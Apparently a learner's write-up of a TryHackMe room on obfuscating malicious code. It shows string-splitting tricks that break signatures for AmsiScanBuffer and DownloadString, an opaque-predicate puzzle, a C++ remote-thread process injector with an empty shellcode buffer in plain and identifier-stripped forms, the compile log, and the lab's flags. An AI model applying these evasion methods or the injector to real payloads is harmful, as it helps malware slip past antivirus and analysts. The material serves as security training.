---
Leverage tool-agnostic software obfuscation practices to hide malicious functions and create unique code.
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/7ec073c23670722c04caa1056194f8aa.png)

###  Introduction 

Obfuscation is an essential component of detection evasion methodology and preventing analysis of malicious software. Obfuscation originated to protect software and intellectual property from being stolen or reproduced. While it is still widely used for its original purpose, adversaries have adapted its use for malicious intent.

In this room, we will observe obfuscation from multiple perspectives and break down obfuscation methods.
Learning Objectives

    Learn how to evade modern detection engineering using tool-agnostic obfuscation
    Understand the principles of obfuscation and its origins from intellectual property protection
    Implement obfuscation methods to hide malicious functions

Before beginning this room, familiarize yourself with basic programming logic and syntax. Knowledge of C and PowerShell is recommended but not required.

We have provided several machines with the required files and web servers to complete this room. Using the credentials below, you can access the machine and web server in-browser or through RDP.

Machine IP: MACHINE_IP             Username: Student             Password: TryHackMe!

This is going to be a lot of information. Please put on your evil helmets and locate your nearest fire extinguisher.

![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3dd905a363f9b95560b5d0f7dc250ac5.png)
### Origins of Obfuscation 

Obfuscation is widely used in many software-related fields to protect IP (Intellectual Property) and other proprietary information an application may contain.

For example, the popular game: Minecraft uses the obfuscator [ProGuard](https://github.com/Guardsquare/proguard) to obfuscate and minimize its Java classes. Minecraft also releases obfuscation maps with limited information as a translator between the old un-obfuscated classes and the new obfuscated classes to support the modding community.

This is only one example of the wide range of ways obfuscation is publicly used. To document and organize the variety of obfuscation methods, we can reference the Layered obfuscation: a taxonomy of software obfuscation techniques for layered security paper. This research paper organizes obfuscation methods by layers, similar to the OSI model but for application data flow. Below is the figure used as the complete overview of each taxonomy layer.
https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/42fdab7091783f27a58c26c7b82ec09a.png)

Each sub-layer is then broken down into specific methods that can achieve the overall objective of the sub-layer.

In this room, we will primarily focus on the code-element layer of the taxonomy, as seen in the figure below.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/246ac1239f25ea18b52459ad9de5610c.png)

To use the taxonomy, we can determine an objective and then pick a method that fits our requirements. For example, suppose we want to obfuscate the layout of our code but cannot modify the existing code. In that case, we can inject junk code, summarized by the taxonomy:

Code Element Layer > Obfuscating Layout > Junk Codes.

But how could this be used maliciously? Adversaries and malware developers can leverage obfuscation to break signatures or prevent program analysis. In the upcoming tasks, we will discuss both perspectives of malware obfuscation, including the purpose and underlying techniques of each.


How many core layers make up the Layered Obfuscation Taxonomy?
*4*

What sub-layer of the Layered Obfuscation Taxonomy encompasses meaningless identifiers?
*Obfuscating Layout*

###  Obfuscation's Function for Static Evasion

Two of the more considerable security boundaries in the way of an adversary are anti-virus engines and EDR (Endpoint Detection & Response) solutions. As covered in the Introduction to Anti-virus room, both platforms will leverage an extensive database of known signatures referred to as static signatures as well as heuristic signatures that consider application behavior.

To evade signatures, adversaries can leverage an extensive range of logic and syntax rules to implement obfuscation. This is commonly achieved by abusing data obfuscation practices that hide important identifiable information in legitimate applications.

The aforementioned white paper: Layered Obfuscation Taxonomy, summarizes these practices well under the code-element layer. Below is a table of methods covered by the taxonomy in the obfuscating data sub-layer.

Diagram showing the objectives of the Obfuscating Data Sub-Layer: Array Transformation, Data Encoding, Data Procedurization, and Data Splitting/Merging

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/10577cd43a7c96046b9c69764cf3b575.png)

Obfuscation Method	Purpose
Array Transformation
	Transforms an array by splitting, merging, folding, and flattening
Data Encoding
	Encodes data with mathematical functions or ciphers
Data Procedurization
	Substitutes static data with procedure calls
Data Splitting/Merging
	Distributes information of one variable into several new variables

In the upcoming tasks, we will primarily focus on data splitting/merging; because static signatures are weaker, we generally only need to focus on that one aspect in initial obfuscation.

Check out the Encoding/Packing/Binder/Crypters room for more information about data encoding, and the Signature Evasion room for more information about data procedurization and transformation.


What obfuscation method will break or split an object?
*Data Splitting*



What obfuscation method is used to rewrite static data with a procedure call?
*Data Procedurization*

### Object Concatenation 

Concatenation is a common programming concept that combines two separate objects into one object, such as a string.

A pre-defined operator defines where the concatenation will occur to combine two independent objects. Below is a generic example of string concatenation in Python.

```
┌──(kali㉿kali)-[~]
└─$ python
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "hi "
>>> b = "dog"
>>> c = a + b
>>> print(c)
hi dog

```

```
>>> A = "Hello "
>>> B = "THM"
>>> C = A + B
>>> print(C)
Hello THM
>>>

```

Depending on the language used in a program, there may be different or multiple pre-defined operators than can be used for concatenation. Below is a small table of common languages and their corresponding pre-defined operators.
Language
	Concatenation Operator
Python
	“+”
PowerShell
	“+”, ”,”, ”$”, or no operator at all
C#
	“+”, “String.Join”, “String.Concat”
C
	“strcat”
C++
	“+”, “append”

The aforementioned white paper: Layered Obfuscation Taxonomy, summarizes these practices well under the code-element layer’s data splitting/merging sub-layer.

What does this mean for attackers? Concatenation can open the doors to several vectors to modify signatures or manipulate other aspects of an application. The most common example of concatenation being used in malware is breaking targeted static signatures, as covered in the Signature Evasion room. Attackers can also use it preemptively to break up all objects of a program and attempt to remove all signatures at once without hunting them down, commonly seen in obfuscators as covered in task 9.

Below we will observe a static Yara rule and attempt to use concatenation to evade the static signature.

```
rule ExampleRule
{
    strings:
        $text_string = "AmsiScanBuffer"
        $hex_string = { B8 57 00 07 80 C3 }

    condition:
        $my_text_string or $my_hex_string
}
```

When a compiled binary is scanned with Yara, it will create a positive alert/detection if the defined string is present. Using concatenation, the string can be functionally the same but will appear as two independent strings when scanned, resulting in no alerts.

IntPtr ASBPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer"); 

IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer"); 

If the second code block were to be scanned with the Yara rule, there would be no alerts!

Extending from concatenation, attackers can also use non-interpreted characters to disrupt or confuse a static signature. These can be used independently or with concatenation, depending on the strength/implementation of the signature. Below is a table of some common non-interpreted characters that we can leverage.
Character
	Purpose
	Example
Breaks
	Break a single string into multiple sub strings and combine them
	
```
('co'+'ffe'+'e')
Reorders
	Reorder a string’s components
	

('{1}{0}'-f'ffee','co')
Whitespace
	Include white space that is not interpreted
	

.( 'Ne' +'w-Ob' + 'ject')
Ticks
	Include ticks that are not interpreted
	

d`own`LoAd`Stri`ng
Random Case
	Tokens are generally not case sensitive and can be any arbitrary case
	

dOwnLoAdsTRing
```

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet until it evades Defender’s detections.

![[Pasted image 20220916165550.png]]

To get you started, we recommend breaking up each section of the code and observe how it interacts or is detected. You can then break the signature present in the independent section and add another section to it until you have a clean snippet.

Once you think your snippet is sufficiently obfuscated, submit it to the webserver at http://10.10.25.43 ; if successful a flag will appear in a pop-up.

If you are still stuck we have provided a walkthrough of the solution below.


What flag is found after uploading a properly obfuscated snippet?

![[Pasted image 20220916193019.png]]

![[Pasted image 20220916193004.png]]

*THM{koNC473n473_4Ll_7H3_7H1n95}*

### Obfuscation's Function for Analysis Deception 

After obfuscating basic functions of malicious code, it may be able to pass software detections but is still susceptible to human analysis. While not a security boundary without further policies, analysts and reverse engineers can gain deep insight into the functionality of our malicious application and halt operations.

Adversaries can leverage advanced logic and mathematics to create more complex and harder-to-understand code to combat analysis and reverse engineering.

For more information about reverse engineering, check out the Malware Analysis module.

The aforementioned white paper: Layered Obfuscation Taxonomy, summarizes these practices well under other sub-layers of the code-element layer. Below is a table of methods covered by the taxonomy in the obfuscating layout and obfuscating controls sub-layers.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/180c008b9c27d83650181d0703586302.png)
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/80e480508a64290f424a4409d2270799.png)
Obfuscation Method
	Purpose
Junk Code
	Add junk instructions that are non-functional, also known as a code stubs
Separation of Related Code
	Separate related codes or instructions to increase difficulty in reading the program
Stripping Redundant Symbols
	Strips symbolic information such as debug information or other symbol tables
Meaningless Identifiers
	Transform a meaningful identifier to something meaningless
Implicit Controls
	Converts explicit controls instructions to implicit instructions
Dispatcher-based Controls
	Determines the next block to be executed during the runtime
Probabilistic Control Flows
	Introduces replications of control flows with the same semantics but different syntax
Bogus Control Flows
	Control flows deliberately added to a program but will never be executed

In the upcoming tasks, we will demonstrate several of the above methods in an agnostic format.

Check out the Sandbox Evasion room for more information about anti-analysis and anti-reversing



What are junk instructions referred to as in junk code?
*Code stubs*

What obfuscation layer aims to confuse an analyst by manipulating the code flow and abstract syntax trees?
*Obfuscating Controls*

### Code Flow and Logic 

Control flow is a critical component of a program’s execution that will define how a program will logically proceed. Logic is one of the most significant determining factors to an application’s control flow and encompasses various uses such as if/else statements or for loops. A program will traditionally execute from the top-down; when a logic statement is encountered, it will continue execution by following the statement.

Below is a table of some logic statements you may encounter when dealing with control flows or program logic.

Logic Statement
	Purpose
if/else
	Executes only if a condition is met, else it will execute a different code block
try/catch
	Will try to execute a code block and catch it if it fails to handle errors.
switch case
	A switch will follow similar conditional logic to an if statement but checks several different possible conditions with cases before resolving to a break or default
for/while loop
	A for loop will execute for a set amount of a condition. A while loop will execute until a condition is no longer met.

To make this concept concrete, we can observe an example function and its corresponding CFG (Control Flow Graph) to depict it’s possible control flow paths.


```
x = 10 
if(x > 7):
	print("This executes")
else:
	print("This is ignored")
```

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/cfc2504b9a4a76682d724413080e3729.png)

What does this mean for attackers? An analyst can attempt to understand a program’s function through its control flow; while problematic, logic and control flow is almost effortless to manipulate and make arbitrarily confusing. When dealing with control flow, an attacker aims to introduce enough obscure and arbitrary logic to confuse an analyst but not too much to raise further suspicion or potentially be detected by a platform as malicious.

In the upcoming task, we will discuss different control flow patterns an attacker can use to confuse an analyst.


Can logic change and impact the control flow of a program? (T/F)
*T*

### Arbitrary Control Flow Patterns 

To craft arbitrary control flow patterns we can leverage maths, logic, and/or other complex algorithms to inject a different control flow into a malicious function.

We can leverage predicates to craft these complex logic and/or mathematical algorithms. Predicates refer to the decision-making of an input function to return true or false. Breaking this concept down at a high level, we can think of a predicate similar to the condition an if statement uses to determine if a code block will be executed or not, as seen in the example in the previous task.

Applying this concept to obfuscation, opaque predicates are used to control a known output and input. The paper, Opaque Predicate: Attack and Defense in Obfuscated Binary Code, states, “An opaque predicate is a predicate whose value is known to the obfuscator but is difficult to deduce. It can be seamlessly applied with other obfuscation methods such as junk code to turn reverse engineering attempts into arduous work.” Opaque predicates fall under the bogus control flow and probabilistic control flow methods of the taxonomy paper; they can be used to arbitrarily add logic to a program or refactor the control flow of a pre-existing function.
https://etda.libraries.psu.edu/files/final_submissions/17513

The topic of opaque predicates requires a deeper understanding of mathematics and computing principles, so we will not cover it in-depth, but we will observe one common example.

The Collatz Conjecture is a common mathematical problem that can be used as an example of an opaque predicate. It states: If two arithmetic operations are repeated, they will return one from every positive integer. The fact that we know it will always output one for a known input (a positive integer) means it is a viable opaque predicate. For more information about the Collatz conjecture, refer to the Collatz Problem. Below is an example of the Collatz conjecture applied in Python.

https://mathworld.wolfram.com/CollatzProblem.html

```
x = 0
while(x > 1):
	if(x%2==1):
		x=x*3+1
	else:
		x=x/2
	if(x==1):
		print("hello!") 
```

In the above code snippet, the Collatz conjecture will only perform its mathematical operations if x > 1, resulting in 1 or TRUE. From the definition of the Collatz problem, it will always return one for a positive integer input, so the statement will always return true if x is a positive integer greater than one.

To prove the efficacy of this opaque predicate, we can observe its CFG (Control Flow Graph) to the right. If this is what an interpreted function looks like, just imagine what a compiled function may look like to an analyst.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c1a1b8196a13becaa1efec050260c81b.png)

Using the knowledge you have accrued throughout this task, put yourself into the shoes of an analyst and attempt to decode the original function and output of the code snippet below.

If you correctly follow the print statements, it will result in a flag you can submit.

```
x = 3
swVar = 1
a = 112340857612345
b = 1122135047612359087
i = 0
case_1 = ["T","d","4","3","3","3","e","1","g","w","p","y","8","4"]
case_2 = ["1a","H","3a","4a","5a","3","7a","8a","d","10a","11a","12a","!","14a"]
case_3 = ["1b","2b","M","4b","5b","6b","c","8b","9b","3","11b","12b","13b","14b"]
case_4 = ["1c","2c","3c","{","5c","6c","7c","8c","9c","10c","d","12c","13c","14c"]
case_5 = ["1d","2d","3d","4d","D","6d","7d","o","9d","10d","11d","!","13d","14d"]
case_6 = ["1e","2e","3e","4e","5e","6e","7e","8e","9e","10e","11e","12e","13e","}"]

while (x > 1):
    if (x % 2 == 1):
        x = x * 3 + 1
    else:
        x = x / 2
    if (x == 1):
        for y in case_1:
            match swVar:
                case 1:
                    print(case_1[i])
                    a = 2
                    b = 214025
                    swVar = 2
                case 2:
                    print(case_2[i])
                    if (a > 10):
                        swVar = 6
                    else:
                        swVar = 3
                case 3:
                    print(case_3[i])
                    b = b + a
                    if (b < 10):
                        swVar = 5
                    else:
                        swVar = 4
                case 4:
                    print(case_4[i])
                    b -= b
                    swVar = 5
                case 5:
                    print(case_5[i])
                    a += a
                    swVar = 2
                case 6:
                    print(case_5[11])
                    print(case_6[i])
                    break
            i = i + 1 
```

![[Pasted image 20220916202903.png]]

What flag is found after properly reversing the provided snippet?
*THM{D3cod3d!!}*

### Protecting and Stripping Identifiable Information 

﻿Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won't be able to reconstruct its original function.

At a high level, we should consider three different types of identifiable data: code structure, object names, and file/compilation properties. In this task, we will break down the core concepts of each and a case study of a practical approach to each.
Object Names

Object names offer some of the most significant insight into a program's functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function.

The importance of literal object names may change depending on if the language is compiled  or interpreted. If an interpreted language such as Python or PowerShell is used, then all objects matter and must be modified. If a compiled language such as C or C# is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an IO operation.

The aforementioned white paper: Layered Obfuscation Taxonomy, summarizes these practices well under the code-element layer’s meaningless identifiers method.

Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language.

As an example of a compiled language, we can observe a process injector written in C++ that reports its status to the command line.

```
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
}

```

Let’s use strings to see exactly what was leaked when this source code is compiled.

```
C:\>.\strings.exe "\Injector.exe"

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
>FU
z';
z';
...
[snip]
...
Y_^[
leaked
shellcode
2_^[]
...
[snip]
...
std::_Adjust_manually_vector_aligned
"invalid argument"
string too long
This was leaked in the strings
Handle obtained for
Buffer Created
Process written with buffer
Closing handle
std::_Allocate_manually_vector_aligned
bad allocation
Stack around the variable '
...
[snip]
...
8@9H9T9X9\\9h9|9
:$:(:D:H:
@1p1
```

Notice that all of the iostream was written to strings, and even the shellcode byte array was leaked. This is a smaller program, so imagine what a fleshed-out and un-obfuscated program would look like!

We can remove comments and replace the meaningful identifiers to resolve this problem.


```
#include "windows.h"

int main(int argc, char* argv[])
{
	unsigned char awoler[] = "";

	HANDLE awerfu;
	HANDLE rwfhbf;
	PVOID iauwef;

	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
	CloseHandle(awerfu);

	return 0;
}

```

We should no longer have any identifiable string information, and the program is safe from string analysis.

As an example for an interpreted language we can observe the deprecated Badger PowerShell loader from the BRC4 Community Kit.

https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1

You may notice that some cmdlets and functions are kept in their original state… why is that? Depending on your objectives, you may want to create an application that can still confuse reverse engineers after detection but may not look immediately suspicious. If a malware developer were to obfuscate all cmdlets and functions, it would raise the entropy in both interpreted and compiled languages resulting in higher EDR alert scores. It could also lead to an interpreted snippet appearing suspicious in logs if it is seemingly random or visibly heavily obfuscated.
Code Structure

Code structure can be a bothersome problem when dealing with all aspects of malicious code that are often overlooked and not easily identified. If not adequately addressed in both interpreted and compiled languages, it can lead to signatures or easier reverse engineering from an analyst.

As covered in the aforementioned taxonomy paper, junk code and reordering code are both widely used as additional measures to add complexity to an interpreted program. Because the program is not compiled, an analyst has much greater insight into the program, and if not artificially inflated with complexity, they can focus on the exact malicious functions of an application.

Separation of related code can impact both interpreted and compiled languages and result in hidden signatures that may be hard to identify. A heuristic signature engine may determine whether a program is malicious based on the surrounding functions or API calls. To circumvent these signatures, an attacker can randomize the occurrence of related code to fool the engine into believing it is a safe call or function.
File & Compilation Properties

More minor aspects of a compiled binary, such as the compilation method, may not seem like a critical component, but they can lead to several advantages to assist an analyst. For example, if a program is compiled as a debug build, an analyst can obtain all the available global variables and other program information.

The compiler will include a symbol file when a program is compiled as a debug build. Symbols commonly aid in debugging a binary image and can contain global and local variables, function names, and entry points. Attackers must be aware of these possible problems to ensure proper compilation practices and that no information is leaked to an analyst.

Luckily for attackers, symbol files are easily removed through the compiler or after compilation. To remove symbols from a compiler like Visual Studio, we need to change the compilation target from Debug to Release or use a lighter-weight compiler like mingw.

If we need to remove symbols from a pre-compiled image, we can use the command-line utility: strip.

The aforementioned white paper: Layered Obfuscation Taxonomy, summarizes these practices well under the code-element layer’s stripping redundant symbols method.

Below is an example of using strip to remove the symbols from a binary compiled in gcc with debugging enabled.


Several other properties should be considered before actively using a tool, such as entropy or hash. These concepts are covered in task 5 of the Signature Evasion room.

Using the knowledge you have accrued throughout this task, remove any meaningful identifiers or debug information from the C++ source code below using the AttackBox or your own virtual machine.

Once adequately obfuscated and stripped compile the source code using MingW32-G++ and submit it to the webserver at http://10.10.92.241/.

Note: the file name must be challenge-8.exe to receive the flag.

```
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
} 
```

 What flag is found after uploading a properly obfuscated snippet? 
 To build the source, use x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe

```
┌──(kali㉿kali)-[~/obfus]
└─$ nano challenge-8.cpp
                                                                                           
┌──(kali㉿kali)-[~/obfus]
└─$ x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
x86_64-w64-mingw32-g++: command not found
                                                                                           
┌──(kali㉿kali)-[~/obfus]
└─$ i686-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
i686-w64-mingw32-g++: command not found
                                                                                           
┌──(kali㉿kali)-[~/obfus]
└─$ apt install g++-mingw-w64-i686                      
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
                                                                                           
┌──(kali㉿kali)-[~/obfus]
└─$ sudo apt install g++-mingw-w64-i686                    
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  binutils-mingw-w64-i686 g++-mingw-w64-i686-posix g++-mingw-w64-i686-win32
  gcc-mingw-w64-base gcc-mingw-w64-i686-posix gcc-mingw-w64-i686-posix-runtime
  gcc-mingw-w64-i686-win32 gcc-mingw-w64-i686-win32-runtime mingw-w64-common
  mingw-w64-i686-dev
Suggested packages:
  gcc-10-locales wine
The following NEW packages will be installed:
  binutils-mingw-w64-i686 g++-mingw-w64-i686 g++-mingw-w64-i686-posix
  g++-mingw-w64-i686-win32 gcc-mingw-w64-base gcc-mingw-w64-i686-posix
  gcc-mingw-w64-i686-posix-runtime gcc-mingw-w64-i686-win32
  gcc-mingw-w64-i686-win32-runtime mingw-w64-common mingw-w64-i686-dev
0 upgraded, 11 newly installed, 0 to remove and 731 not upgraded.
Need to get 106 MB of archives.
After this operation, 567 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://http.kali.org/kali kali-rolling/main amd64 binutils-mingw-w64-i686 amd64 2.37-7+9 [2,527 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 mingw-w64-common all 10.0.0-2 [5,173 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 mingw-w64-i686-dev all 10.0.0-2 [2,810 kB]
Get:4 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-base amd64 10.3.0-15+24.4 [187 kB]
Get:5 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-posix-runtime amd64 10.3.0-15+24.4 [10.7 MB]
Get:6 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-posix amd64 10.3.0-15+24.4 [26.3 MB]
Get:7 http://http.kali.org/kali kali-rolling/main amd64 g++-mingw-w64-i686-posix amd64 10.3.0-15+24.4 [10.5 MB]
Get:8 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-win32-runtime amd64 10.3.0-15+24.4 [10.7 MB]
Get:9 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-win32 amd64 10.3.0-15+24.4 [26.3 MB]
Get:10 http://http.kali.org/kali kali-rolling/main amd64 g++-mingw-w64-i686-win32 amd64 10.3.0-15+24.4 [10.5 MB]
Get:11 http://http.kali.org/kali kali-rolling/main amd64 g++-mingw-w64-i686 all 10.3.0-15+24.4 [186 kB]
Fetched 106 MB in 8s (13.7 MB/s)                                                          
Selecting previously unselected package binutils-mingw-w64-i686.
(Reading database ... 309085 files and directories currently installed.)
Preparing to unpack .../00-binutils-mingw-w64-i686_2.37-7+9_amd64.deb ...
Unpacking binutils-mingw-w64-i686 (2.37-7+9) ...
Selecting previously unselected package mingw-w64-common.
Preparing to unpack .../01-mingw-w64-common_10.0.0-2_all.deb ...
Unpacking mingw-w64-common (10.0.0-2) ...
Selecting previously unselected package mingw-w64-i686-dev.
Preparing to unpack .../02-mingw-w64-i686-dev_10.0.0-2_all.deb ...
Unpacking mingw-w64-i686-dev (10.0.0-2) ...
Selecting previously unselected package gcc-mingw-w64-base:amd64.
Preparing to unpack .../03-gcc-mingw-w64-base_10.3.0-15+24.4_amd64.deb ...
Unpacking gcc-mingw-w64-base:amd64 (10.3.0-15+24.4) ...
Selecting previously unselected package gcc-mingw-w64-i686-posix-runtime.
Preparing to unpack .../04-gcc-mingw-w64-i686-posix-runtime_10.3.0-15+24.4_amd64.deb ...
Unpacking gcc-mingw-w64-i686-posix-runtime (10.3.0-15+24.4) ...
Selecting previously unselected package gcc-mingw-w64-i686-posix.
Preparing to unpack .../05-gcc-mingw-w64-i686-posix_10.3.0-15+24.4_amd64.deb ...
Unpacking gcc-mingw-w64-i686-posix (10.3.0-15+24.4) ...
Selecting previously unselected package g++-mingw-w64-i686-posix.
Preparing to unpack .../06-g++-mingw-w64-i686-posix_10.3.0-15+24.4_amd64.deb ...
Unpacking g++-mingw-w64-i686-posix (10.3.0-15+24.4) ...
Selecting previously unselected package gcc-mingw-w64-i686-win32-runtime.
Preparing to unpack .../07-gcc-mingw-w64-i686-win32-runtime_10.3.0-15+24.4_amd64.deb ...
Unpacking gcc-mingw-w64-i686-win32-runtime (10.3.0-15+24.4) ...
Selecting previously unselected package gcc-mingw-w64-i686-win32.
Preparing to unpack .../08-gcc-mingw-w64-i686-win32_10.3.0-15+24.4_amd64.deb ...
Unpacking gcc-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
Selecting previously unselected package g++-mingw-w64-i686-win32.
Preparing to unpack .../09-g++-mingw-w64-i686-win32_10.3.0-15+24.4_amd64.deb ...
Unpacking g++-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
Selecting previously unselected package g++-mingw-w64-i686.
Preparing to unpack .../10-g++-mingw-w64-i686_10.3.0-15+24.4_all.deb ...
Unpacking g++-mingw-w64-i686 (10.3.0-15+24.4) ...
Setting up gcc-mingw-w64-base:amd64 (10.3.0-15+24.4) ...
Setting up gcc-mingw-w64-i686-posix-runtime (10.3.0-15+24.4) ...
Setting up binutils-mingw-w64-i686 (2.37-7+9) ...
Setting up gcc-mingw-w64-i686-win32-runtime (10.3.0-15+24.4) ...
Setting up mingw-w64-common (10.0.0-2) ...
Setting up mingw-w64-i686-dev (10.0.0-2) ...
Setting up gcc-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
update-alternatives: using /usr/bin/i686-w64-mingw32-gcc-win32 to provide /usr/bin/i686-w64-mingw32-gcc (i686-w64-mingw32-gcc) in auto mode
Setting up g++-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
update-alternatives: using /usr/bin/i686-w64-mingw32-g++-win32 to provide /usr/bin/i686-w64-mingw32-g++ (i686-w64-mingw32-g++) in auto mode
Setting up gcc-mingw-w64-i686-posix (10.3.0-15+24.4) ...
Setting up g++-mingw-w64-i686-posix (10.3.0-15+24.4) ...
Setting up g++-mingw-w64-i686 (10.3.0-15+24.4) ...
Processing triggers for man-db (2.10.2-1) ...
Processing triggers for kali-menu (2022.3.1) ...
Scanning processes...                                                                      
Scanning processor microcode...                                                            
Scanning linux images...                                                                   

Running kernel seems to be up-to-date.

The processor microcode seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
                                                                                           
┌──(kali㉿kali)-[~/obfus]
└─$ i686-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
                                                                                           
┌──(kali㉿kali)-[~/obfus]
└─$ ls
challenge-8.cpp  challenge-8.exe  flag1.ps

┌──(kali㉿kali)-[~/obfus]
└─$ cat challenge-8.cpp 
#include "windows.h"

int main(int argc, char* argv[])
{
        unsigned char awoler[] = "";

        HANDLE awerfu;
        HANDLE rwfhbf;
        PVOID iauwef;

        awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
        iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
        rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
        CloseHandle(awerfu);

        return 0;
}

```

![[Pasted image 20220916210810.png]]

*THM{Y0Ur_1NF0_15_M1N3}*

### Conclusion 



Obfuscation can be one of the most lucrative tools in an attackers arsenal when it comes to evasion. Both attackers and defenders alike should understand and assess not only its uses but also its impacts.

In this room, we covered the principles of obfuscation as it relates to both signature evasion and anti reverse-engineering.

The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.

At this point, you can take obfuscation a step further into signature evasion where it is directly applied to signatures or use it at a higher-level with obfuscators.


Read the above and continue learning!

[[AV Evasion Shellcode]]